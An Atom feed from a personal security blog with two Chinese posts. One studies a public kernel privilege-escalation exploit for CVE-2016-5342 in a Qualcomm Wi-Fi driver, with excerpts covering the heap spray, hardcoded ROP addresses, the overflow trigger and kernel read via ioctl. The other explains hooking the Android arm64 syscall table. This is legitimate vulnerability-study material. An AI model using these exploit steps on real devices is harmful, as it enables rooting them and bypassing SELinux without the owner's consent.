<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ne2der</title>
  <subtitle>Know Yourself</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ne2der.github.io/"/>
  <updated>2017-05-20T09:49:55.416Z</updated>
  <id>http://ne2der.github.io/</id>
  
  <author>
    <name>ne2der</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>EXP学习--CVE-2016-5342</title>
    <link href="http://ne2der.github.io/2017/05/20/EXP-cve-2016-5342/"/>
    <id>http://ne2der.github.io/2017/05/20/EXP-cve-2016-5342/</id>
    <published>2017-05-20T06:15:28.000Z</published>
    <updated>2017-05-20T09:49:55.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EXP学习-CVE-2016-5342"><a href="#EXP学习-CVE-2016-5342" class="headerlink" title="[EXP学习]___CVE-2016-5342"></a>[EXP学习]___CVE-2016-5342</h1><p>编号： CVE-2016-5342<br>EXP: <a href="https://github.com/freener/exploits" target="_blank" rel="external">Github</a><br>EXP作者：<a href="https://github.com/freener" target="_blank" rel="external">freener</a><br>相关链接：<a href="https://source.android.com/security/bulletin/2016-10-01" target="_blank" rel="external">AndroidBullitin</a>,<a href="https://www.codeaurora.org/buffer-overflow-vulnerability-wcnsswlanwrite-cve-2016-5342" target="_blank" rel="external">codeaurora</a></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这是一个存在于高通wifi驱动中的buffer overflow漏洞，通过<a href="https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=579e796cb089324c55e0e689a180575ba81b23d9" target="_blank" rel="external">PATCH</a>分析漏洞的原理与后果。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">diff --git a/drivers/net/wireless/wcnss/wcnss_wlan.c b/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">index 86f3a48..3f9eeab 100644</div><div class="line">--- a/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">+++ b/drivers/net/wireless/wcnss/wcnss_wlan.c</div><div class="line">@@ -3339,7 +3339,7 @@ static ssize_t wcnss_wlan_write(struct file *fp, const char __user</div><div class="line"> 		return -EFAULT;</div><div class="line"> </div><div class="line"> 	if ((UINT32_MAX - count &lt; penv-&gt;user_cal_rcvd) ||</div><div class="line">-	     MAX_CALIBRATED_DATA_SIZE &lt; count + penv-&gt;user_cal_rcvd) &#123;</div><div class="line">+		(penv-&gt;user_cal_exp_size &lt; count + penv-&gt;user_cal_rcvd)) &#123;</div><div class="line"> 		pr_err(DEVICE " invalid size to write %zu\n", count +</div><div class="line"> 				penv-&gt;user_cal_rcvd);</div><div class="line"> 		rc = -ENOMEM;</div></pre></td></tr></table></figure></p>
<p>通过PATCH可知，漏洞原因是边界检查不严，问题出在count + penv-&gt;user_cal_rcvd的值上，函数不大，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> ssize_t <span class="title">wcnss_wlan_write</span><span class="params">(struct file *fp, <span class="keyword">const</span> <span class="keyword">char</span> __user</span></span></div><div class="line">			*user_buffer, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *position)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> rc = <span class="number">0</span>;</div><div class="line">	u32 size = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (!penv || !penv-&gt;device_opened || penv-&gt;user_cal_available)</div><div class="line">		<span class="keyword">return</span> -EFAULT;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (penv-&gt;user_cal_rcvd == <span class="number">0</span> &amp;&amp; count &gt;= <span class="number">4</span></div><div class="line">			&amp;&amp; !penv-&gt;user_cal_data) &#123;</div><div class="line">		rc = copy_from_user((<span class="keyword">void</span> *)&amp;size, user_buffer, <span class="number">4</span>);  <span class="comment">//获取用户态传入的前四个byte中的数据放入size中，这四个byte是传入数据的长度</span></div><div class="line">		<span class="keyword">if</span> (!size || size &gt; MAX_CALIBRATED_DATA_SIZE) &#123;</div><div class="line">			pr_err(DEVICE <span class="string">" invalid size to write %d\n"</span>, size);</div><div class="line">			<span class="keyword">return</span> -EFAULT;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		rc += count;</div><div class="line">		count -= <span class="number">4</span>;</div><div class="line">		penv-&gt;user_cal_exp_size =  size;</div><div class="line">		penv-&gt;user_cal_data = kmalloc(size, GFP_KERNEL);<span class="comment">//分配size大小的空间用于存放数据</span></div><div class="line">		<span class="keyword">if</span> (penv-&gt;user_cal_data == <span class="literal">NULL</span>) &#123;</div><div class="line">			pr_err(DEVICE <span class="string">" no memory to write\n"</span>);</div><div class="line">			<span class="keyword">return</span> -ENOMEM;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> (<span class="number">0</span> == count)</div><div class="line">			<span class="keyword">goto</span> <span class="built_in">exit</span>;</div><div class="line"></div><div class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (penv-&gt;user_cal_rcvd == <span class="number">0</span> &amp;&amp; count &lt; <span class="number">4</span>)</div><div class="line">		<span class="keyword">return</span> -EFAULT;</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ((UINT32_MAX - count &lt; penv-&gt;user_cal_rcvd) ||</div><div class="line">	     MAX_CALIBRATED_DATA_SIZE &lt; count + penv-&gt;user_cal_rcvd) &#123;</div><div class="line">		pr_err(DEVICE <span class="string">" invalid size to write %zu\n"</span>, count +</div><div class="line">				penv-&gt;user_cal_rcvd);</div><div class="line">		rc = -ENOMEM;</div><div class="line">		<span class="keyword">goto</span> <span class="built_in">exit</span>;</div><div class="line">	&#125;</div><div class="line">	rc = copy_from_user((<span class="keyword">void</span> *)penv-&gt;user_cal_data +</div><div class="line">			penv-&gt;user_cal_rcvd, user_buffer, count); <span class="comment">//拷贝数据到分配的内存中</span></div><div class="line">	<span class="keyword">if</span> (<span class="number">0</span> == rc) &#123;</div><div class="line">		penv-&gt;user_cal_rcvd += count;</div><div class="line">		rc += count;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (penv-&gt;user_cal_rcvd == penv-&gt;user_cal_exp_size) &#123;</div><div class="line">		penv-&gt;user_cal_available = <span class="literal">true</span>;</div><div class="line">		pr_info_ratelimited(<span class="string">"wcnss: user cal written"</span>);</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="built_in">exit</span>:</div><div class="line">	<span class="keyword">return</span> rc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>由此，问题很明显，分配的空间由size控制，拷贝的数据长度却由count控制。size即传入数据的前四个字节，count是用户传入的参数，所以如果count&gt;size就可以越界写。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过漏洞原理学习freener的EXP代码就比较清晰了。</p>
<h3 id="1-喷射"><a href="#1-喷射" class="headerlink" title="1.喷射"></a>1.喷射</h3><p>首先分配大量的binder_fd占用内存碎片，保证后面的分配的fd是连续的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span>( <span class="string">"[+] Spray SLUB Cache\n"</span> );</div><div class="line">    <span class="keyword">for</span>( ; i &lt; BINDER_MAX_FDS; i++ ) &#123;</div><div class="line">        binder_fd[i] = open( <span class="string">"/dev/binder"</span>, O_RDWR );</div><div class="line">        <span class="keyword">if</span> ( binder_fd[i] &lt; <span class="number">0</span> ) &#123;</div><div class="line">            <span class="built_in">printf</span>( <span class="string">"[-] Can not open binder %d\n"</span>, i ); </div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>然后分配几个fd用于部署ROP，由于之前大量分配的fd已经占用了分散的内存片，这些fd在内存中是连续的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; MAX_FD; i++ ) &#123;</div><div class="line">        fd[i] = open( <span class="string">"/dev/msm_mp3"</span>, O_RDWR | O_NONBLOCK );</div><div class="line">        <span class="keyword">if</span> ( fd[i] &lt; <span class="number">0</span> ) &#123;</div><div class="line">            <span class="built_in">printf</span>( <span class="string">"[-] Can not open /dev/msm_mp3\n"</span> );</div><div class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<h3 id="2-部署ROP"><a href="#2-部署ROP" class="headerlink" title="2.部署ROP"></a>2.部署ROP</h3><p>freenr的代码中ROP的地址的特定机型，已经找好了硬编码在代码中的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_READ  ( 0xC04DBE88 )</span></div><div class="line">………………</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> ROP_WRITE ( 0xC0760FE4 )</span></div></pre></td></tr></table></figure></p>
<p>通过漏洞将ROP地址写入内核中。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> length = <span class="number">512</span>;  <span class="comment">//size</span></div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)buffer1 = length;</div><div class="line">*(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(buffer1 + length + <span class="number">0x14C</span>) = ROP_READ;</div><div class="line"><span class="comment">//构造数据</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</div><div class="line">close( fd[<span class="number">0</span>] ); 释放一个fd的空间</div><div class="line">count = write( fd_wlan, buffer1, message1_len + <span class="number">4</span> );  <span class="comment">//触发漏洞 第三个参数即count</span></div><div class="line"></div><div class="line"><span class="built_in">printf</span>( <span class="string">"[+] Trigger Kernel Execution Code\n"</span> );</div><div class="line"><span class="keyword">int</span> result;</div></pre></td></tr></table></figure></p>
<p>最初fd的状态<br><img src="/images/fd-orig.png" alt="fd-orig.png"><br>释放fd[0]空间<br><img src="/images/fd-release.png" alt="fd-release.png"><br>触发漏洞将ROP写入fd[1]空间中，覆盖fd结构体中的函数<br><img src="/images/fd-overwrite.png" alt="fd-overwrite.png"><br>(PS：至于为什么会恰好写到释放的空间中，答案是linux内存的SLUB机制)</p>
<h3 id="3-调用ROP"><a href="#3-调用ROP" class="headerlink" title="3.调用ROP"></a>3.调用ROP</h3><p>直接使用ioctl调用fd，就能调用ROP，将读写两个ROP分别写入两个fd，就可以拥有对内核的写与读能力。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">result  = ioctl( fd[<span class="number">1</span>], <span class="number">0x40046144</span>, SELINUX_ENFORCING );</div><div class="line">    <span class="keyword">if</span> ( result != <span class="number">0x1</span> ) &#123;</div><div class="line">        <span class="built_in">printf</span>( <span class="string">"[-] Read Kernel Failed  %x\n"</span>, result );</div><div class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>后面就是关闭SELINUX，修改cred提权了，就不分析。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;EXP学习-CVE-2016-5342&quot;&gt;&lt;a href=&quot;#EXP学习-CVE-2016-5342&quot; class=&quot;headerlink&quot; title=&quot;[EXP学习]___CVE-2016-5342&quot;&gt;&lt;/a&gt;[EXP学习]___CVE-2016-5342&lt;/
    
    </summary>
    
      <category term="Android" scheme="http://ne2der.github.io/categories/Android/"/>
    
    
      <category term="CVE" scheme="http://ne2der.github.io/tags/CVE/"/>
    
      <category term="EXP" scheme="http://ne2der.github.io/tags/EXP/"/>
    
  </entry>
  
  <entry>
    <title>syscalltable hook for Android arm64</title>
    <link href="http://ne2der.github.io/2017/05/13/syscalltable-hook-for-Android-arm64/"/>
    <id>http://ne2der.github.io/2017/05/13/syscalltable-hook-for-Android-arm64/</id>
    <published>2017-05-13T05:55:21.000Z</published>
    <updated>2017-05-20T06:21:26.114Z</updated>
    
    <content type="html"><![CDATA[<p>终于克服了拖延症写下了第一笔，前段时间看了<a href="https://www.vantagepoint.sg/blog/82-hooking-android-system-calls-for-pleasure-and-benefit" target="_blank" rel="external">Hooking Android System Calls for Pleasure and Benefit</a>，于是就自己尝试着写了一下，综合了其他的思路改用动态获取sys_call_table的方法。思路简单，主要记录下遇到的问题。</p>
<h2 id="定制内核"><a href="#定制内核" class="headerlink" title="定制内核"></a>定制内核</h2><p>首先，为了必须使Kernel支持LKM，上文中给出的方法是在编译内核make defconfig之后，修改源码目录中的.config文件。这种方法修改的选项make时会被override。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">scripts/kconfig/conf --silentoldconfig Kconfig</div><div class="line">.config:214:warning: override: reassigning to symbol MODULES</div><div class="line">#</div><div class="line"># configuration written to .config</div><div class="line">#</div></pre></td></tr></table></figure></p>
<p>回去看.config文件的已经被恢复，实际上选项并没有生效。更简单的方法是修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">arch/platform(arm/arm64/……)/Kconfig</div></pre></td></tr></table></figure></p>
<p>在其中将MODULES，MODULE_UNLOAD添加到default y项中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">config ARM</div><div class="line">        bool</div><div class="line">        default y</div><div class="line">        select MODULES</div><div class="line">        select MODULE_UNLOAD</div><div class="line">        select ARCH_BINFMT_ELF_RANDOMIZE_PIE</div><div class="line">        select ARCH_HAS_ATOMIC64_DEC_IF_POSITIVE</div><div class="line">        select ARCH_HAVE_CUSTOM_GPIO_H</div><div class="line">        select ARCH_HAS_TICK_BROADCAST if GENERIC_CLOCKEVENTS_BROADCAST</div><div class="line">        select ARCH_WANT_IPC_PARSE_VERSION</div><div class="line">        ……</div><div class="line">        ……</div></pre></td></tr></table></figure></p>
<h2 id="定位sys-call-table"><a href="#定位sys-call-table" class="headerlink" title="定位sys_call_table"></a>定位sys_call_table</h2><p>sys_call_table地址的获取方法有多种，如上文采用的/proc/kallsym读取的方法，还以从system.map读。这些方法原理已经已经很多，就不多说了。<br>这里我采用的是用sys_close偏移定位的方法。这种方法的原理是从PAGE_OFFSET开始暴力查找，从每一个地址找NR_close偏移处存储的是否是sys_close来判断当前地址是否是sys_call_table。测试过程中arm一切正常，但是在arm64下却会crash。经过一段时间的排查发现。arm64下由于进行arm兼容，多了一张compat_sys_call_table的表。在内存中它们的位置关系如下。<br><img src="/images/syscalltable_hook_for_Android_arm64_syscallmemory.png" alt="compat_sys_call_in_memory"><br>两张表中存储sys_close的相同，查找程序会先找到compat表中的sys_close,并且由于arm与arm64的系统调用号不同(查看对应的unistd.h确定)，所以找到的地址既不是compat_sys_call_table也不是sys_call_table。根据内存的情况，扩展原来的定位方法，首先用arm的调用号确定compat_sys_call_table地址，在跳过这个地址继续暴力查找，用arm64的调用号确定sys_call_table的地址。</p>
<p>测试环境：android kernel 3.10 arm64<br>丑陋Code：<a href="https://github.com/ne2der/ASyScallHookFrame" target="_blank" rel="external">ASyScallHookFrame</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;终于克服了拖延症写下了第一笔，前段时间看了&lt;a href=&quot;https://www.vantagepoint.sg/blog/82-hooking-android-system-calls-for-pleasure-and-benefit&quot; target=&quot;_blank&quot; 
    
    </summary>
    
      <category term="Android" scheme="http://ne2der.github.io/categories/Android/"/>
    
    
      <category term="HOOK" scheme="http://ne2der.github.io/tags/HOOK/"/>
    
      <category term="ARM64" scheme="http://ne2der.github.io/tags/ARM64/"/>
    
  </entry>
  
</feed>
